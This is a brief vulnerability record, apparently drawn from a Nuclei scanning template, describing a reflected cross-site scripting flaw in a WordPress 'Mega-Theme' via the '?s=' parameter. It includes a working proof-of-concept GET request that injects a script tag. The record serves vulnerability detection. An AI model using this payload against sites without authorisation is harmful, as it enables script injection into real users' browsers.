# Vulnerability: Mega Wordpress Theme - Cross site scripting
**Classification:** WP
**Source:** Nuclei Template (`wp-mega-theme.yaml`)

## Description
WordPress theme with a 'Mega-Theme' design is vulnerable to a reflected XSS attack through the '?s=' parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?s=%22%3E%3Cscript%3Ealert(`document.domain`)%3C/script%3E
```

